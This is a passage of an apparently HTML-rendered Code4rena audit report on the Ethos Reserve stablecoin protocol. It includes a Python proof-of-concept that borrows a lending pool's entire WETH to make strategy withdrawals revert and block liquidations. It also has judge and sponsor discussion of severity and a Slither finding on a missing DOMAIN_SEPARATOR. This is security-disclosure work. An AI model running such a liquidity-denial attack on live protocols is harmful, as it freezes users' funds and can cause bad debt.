class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: usdc_whale})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Setup collateral so we can dry up WETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">usdc.approve(lp, usdc.balanceOf(exploiter), {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: exploiter})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">lp.deposit(usdc, usdc.balanceOf(exploiter), exploiter, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: exploiter})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Borrow Max, so no WETH is borrowable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">to_borrow = weth.balanceOf(a_token)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">lp.borrow(weth, to_borrow, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, exploiter, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: exploiter})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">print</span><span class=\"mtk1\">(weth.balanceOf(a_token))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk3\">## No weth left, next withdrawal will revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Strategy will not be able withdraw</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">to_withdraw = a_token.balanceOf(strategy)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">assert</span><span class=\"mtk1\"> to_withdraw &gt; </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## REVERTS HERE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">lp.withdraw(weth, to_withdraw, strategy, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: strategy})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt; Transaction sent: </span><span class=\"mtk4\">0x</span><span class=\"mtk7\">2d129abc6f69d74db7567de54d9932ac406d2212c350ff7f16e66d3fb034e036</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  Gas price: </span><span class=\"mtk7\">0.0</span><span class=\"mtk1\"> gwei   Gas limit: </span><span class=\"mtk7\">20000000</span><span class=\"mtk1\">   Nonce: </span><span class=\"mtk7\">3</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  LendingPool.withdraw confirmed (SafeMath: subtraction overflow)   Block: </span><span class=\"mtk7\">79015780</span><span class=\"mtk1\">   Gas used: </span><span class=\"mtk7\">138952</span><span class=\"mtk1\"> (</span><span class=\"mtk7\">0.69</span><span class=\"mtk1\">%)</span></span></span></code></pre>\n<p>Any time the Strategy needs to withdraw from the pool, because of <code>_rebalance</code> that withdrawal can be denied, which will consequently prevent Collateral from being pulled, which in turn will prevent Redemptions and Liquidations.</p>\n<p>This means a overlevered malicious actor can bring down the peg of the system while preventing whichever liquidation or redemption they want</p>\n<h3 id=\"remediation-steps-1\" style=\"position:relative;\"><a href=\"#remediation-steps-1\" aria-label=\"remediation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Remediation Steps</h3>\n<p>I’m unclear as to a specific remediation, as AAVE, by design, will lend out all of it’s reserves, meaning that the amount lent out should not be assumed as liquid.</p>\n<p>Theoretically, re-balancing only manually should protect more assets, making the threshold for the attack higher.</p>\n<p>However, any asset sent to the lending pool should be assumed illiquid, meaning that those amounts can be prevented from being withdrawable which will prevent Liquidations and Redemptions, potentially causing bad debt</p>\n<h3 id=\"additional-considerations\" style=\"position:relative;\"><a href=\"#additional-considerations\" aria-label=\"additional considerations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Additional Considerations</h3>\n<p>If LUSD is liquid enough to be shorted, a goal as you’d assume the token to scale, then the attack not only can be performed against the system unconditionally, but can also become profitable as the attacker can arbitrarily force bad debt for the entire portion of collateral in the lendingPool, profiting from the loss of value.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/693#issuecomment-1461604035\">Trust (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Issue is valid. Severity is on the edge between med and high, because impact is “temporary freeze of funds” (cannot be long-term due to incredible interest costs), additionally users can always send a flashbot TX. High severity is almost always reserved for long-term impacts to the protocol, which I don’t see here (attacker sandwich cannot succeed for long-term).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/693#issuecomment-1468704411\">tess3rac7 (Ethos Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>I’m not sure what to make of such reports. To earn interest, there has to be some risk. The lowest risk option is to supply money for others to borrow on a battle-tested protocol such as Aave, Granary etc. Hundreds of yield-bearing strategies have been written by Reaper, Yearn etc. utilizing these protocols. The only way to truly mitigate this issue is to not utilize an external protocol, which conflicts with the ethos of the system.</p>\n<p>Considering this a medium/high bug means ignoring:</p>\n<ul>\n<li>dynamics of money markets, including kinked interest rates</li>\n<li>the fact that ethos will not allocate 100% of its capital to Aave/Granary as that would be reckless to do. Current value is 75% so wardens could easily replicate test scenarios but in the final deployment we’d start off with 10-25% and scale slowly, especially if we can add more strategies to the vault.</li>\n</ul>\n<p>I don’t think either of the above can be ignored. Requesting judge review.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/693#issuecomment-1468713756\">Trust (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@GalloDaSballo - Would like to hear your fact-based opinion before landing on a severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/693#issuecomment-1469558630\">GalloDaSballo (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Multiple things to comment on but the juice of the finding is:</p>\n<ul>\n<li>We can deny getting the capital from AAVE V2 (Granary), because there’s no borrow caps</li>\n<li>Denying the withdrawal makes <code>Vault.withdraw revert</code></li>\n<li><code>_rebalance</code> is called on all collateral changing operations</li>\n<li>Denying <code>_rebalance</code> via <code>Vault.withdraw</code> prevents the functionality of the protocol when it matters (liquidation only matters when there’s debt to liquidate)</li>\n</ul>\n<p>This puts the debt collateralized by this collateral at risk (this is the base layer of the impact, but the impact is higher).</p>\n<p>Because <code>_rebalance</code> is called on all operations, every operation where <code>netAssetMovement</code> is negative, will call <code>Vault.withdraw</code>.</p>\n<p>This means that by denying the ability to recall the <code>yieldingAmount</code>, we have put the whole amount in the ActivePool at risk.</p>\n<p>Meaning that the comments about only the <code>yieldingAmount</code> being put at risk are not correct, the whole amount is at risk because <code>_rebalance</code> happens on all collateral changes.</p>\n<p><strong>Possible Solution</strong></p>\n<p>A LIFO solution would reduce the risk to what the sponsor commented, putting only the strategy capital at risk.</p>\n<p>A LIFO solution would always withdraw from the ActivePool first, and it would have <code>_rebalance</code> being called exclusively manually by the strategist / keeper.</p>\n<p>In that system, the attack would be limited to the % lent to AAVE (still at risk)</p>\n<p>However, the code in-scope is not offering a LIFO solution, it <code>_rebalance</code>s on each collateral change, meaning those operations will be denied.</p>\n<p><strong>On front-running and flashbots</strong></p>\n<p>Afaik private pools are not available on OP nor FTM, meaning that while front-running is “luck based”, it cannot be prevented.</p>\n<p>Also, front-running simply increases ROI, it’s not a pre-condition for the attack.</p>\n<p><strong>On interest rate / cost</strong></p>\n<p>If you were to use AAVEs linear model, even at 1,000% APR, the cost is just 3% per day.</p>\n<p>When enough collateral is present, this is not a high cost to bear to break the peg of the token and profit from it as well as the side effects. (Pay 3% per day, tank the token by 50%)</p>\n<p><strong>Summary</strong></p>\n<p>In summary, the whole collateral movement can be denied because of the rebalancing architecture.</p>\n<p>A LIFO solution could reduce the risk but doesn’t fully avoid the liquidity risk. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/693#issuecomment-1476182008\">Trust (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Too severe for QA by C4 standards, not severe enough for high, so will land on medium (impairment of core functionalities of the protocol under some preconditions).</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-domain_separator-is-missing-in-lusdtokensol\" style=\"position:relative;\"><a href=\"#m-07-domain_separator-is-missing-in-lusdtokensol\" aria-label=\"m 07 domain_separator is missing in lusdtokensol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/638\">[M-07] <code>DOMAIN_SEPARATOR()</code> is missing in LUSDToken.sol</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/638\">matrix_0wl</a>, also found by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/818\">Haipls</a></em></p>\n<p>The <code>DOMAIN_SEPARATOR()</code> function in ERC2612 is an important part of the security of the standard. It is used to prevent replay attacks, which occur when a malicious user records a valid signed message and later sends it again to fraudulently perform an action on behalf of the original signer.</p>\n<p>The <code>DOMAIN_SEPARATOR()</code> is generated based on specific contract parameters, including the contract’s address, the chain ID, and a unique identifier. These parameters ensure that the domain separator is unique to the contract and the chain, and prevent attackers from using the same signature on a different chain or contract.</p>\n<p>If the <code>DOMAIN_SEPARATOR()</code> function is missing from ERC2612, it can significantly impact the security of the standard. It can make it easier for attackers to replay valid signatures, since the domain separator provides a crucial part of the uniqueness and security of the signature.</p>\n<p>Therefore, it’s important to ensure that the <code>DOMAIN_SEPARATOR()</code> function is included and properly implemented in any contract that uses ERC2612.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Output form slither:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"># </span><span class=\"mtk12\">Check</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LUSDToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">## </span><span class=\"mtk12\">Check</span><span class=\"mtk1\"> </span><span class=\"mtk12\">functions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[✓] </span><span class=\"mtk11\">permit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\">,</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">,</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">) </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">present</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">permit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\">,</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">,</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">) -&gt; () (</span><span class=\"mtk12\">correct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">type</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[✓] </span><span class=\"mtk11\">nonces</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">present</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">nonces</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) -&gt; (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) (</span><span class=\"mtk12\">correct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">type</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">nonces</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[ ] </span><span class=\"mtk11\">DOMAIN_SEPARATOR</span><span class=\"mtk1\">() </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">missing</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[✓] </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">present</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() -&gt; (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) (</span><span class=\"mtk12\">correct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">type</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[✓] </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">present</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) -&gt; (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) (</span><span class=\"mtk12\">correct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">type</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[✓] </span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">present</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) -&gt; (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) (</span><span class=\"mtk12\">correct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">type</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">emitted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[✓] </span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">present</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) -&gt; (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) (</span><span class=\"mtk12\">correct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">type</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">emitted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[✓] </span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">present</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) -&gt; (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) (</span><span class=\"mtk12\">correct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">type</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">Approval</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">emitted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[✓] </span><span class=\"mtk11\">allowance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">present</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">allowance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) -&gt; (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) (</span><span class=\"mtk12\">correct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">type</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">allowance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[✓] </span><span class=\"mtk11\">name</span><span class=\"mtk1\">() </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">present</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">name</span><span class=\"mtk1\">() -&gt; (</span><span class=\"mtk12\">string</span><span class=\"mtk1\">) (</span><span class=\"mtk12\">correct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">type</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">name</span><span class=\"mtk1\">() </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[✓] </span><span class=\"mtk11\">symbol</span><span class=\"mtk1\">() </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">present</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">symbol</span><span class=\"mtk1\">() -&gt; (</span><span class=\"mtk12\">string</span><span class=\"mtk1\">) (</span><span class=\"mtk12\">correct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">type</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">symbol</span><span class=\"mtk1\">() </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[✓] </span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">present</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() -&gt; (</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\">) (</span><span class=\"mtk12\">correct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">type</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [✓] </span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span></code></pre>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code, Slither</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation 